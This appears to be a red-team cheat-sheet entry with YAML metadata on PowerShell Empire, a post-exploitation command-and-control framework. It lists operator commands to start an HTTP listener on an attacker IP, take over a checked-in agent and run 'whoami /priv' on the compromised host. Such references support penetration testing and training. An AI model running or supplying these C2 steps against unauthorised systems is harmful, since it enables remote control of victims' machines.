---
description: |
  PowerShell Empire is a post-exploitation C2 framework that uses encrypted HTTP(S) communication channels to task compromised hosts ("agents") after a stager has been executed on the target. The operator first creates and starts an HTTP listener to receive agent check-ins, then, once an agent beacons in, interacts with it to run arbitrary shell commands on the compromised host through Empire's built-in shell command wrapper.

  Command Reference:

  	Attacker IP: 10.10.10.5

  	Listener Port: 80

  	Listener Name: http

command: |
  (Empire) > listeners
  (Empire: listeners) > uselistener http
  (Empire: listeners/http) > set Host http://10.10.10.5
  (Empire: listeners/http) > set Port 80
  (Empire: listeners/http) > execute
  (Empire: listeners) > agents
  (Empire: agents) > interact <AGENT_NAME>
  (Empire: <AGENT_NAME>) > shell whoami /priv
items:
  - Shell
OS:
  - Linux
  - Windows
phases:
  - PostExploitation
references:
  - https://bc-security.gitbook.io/empire-wiki/listeners
  - https://github.com/BC-SECURITY/Empire
---
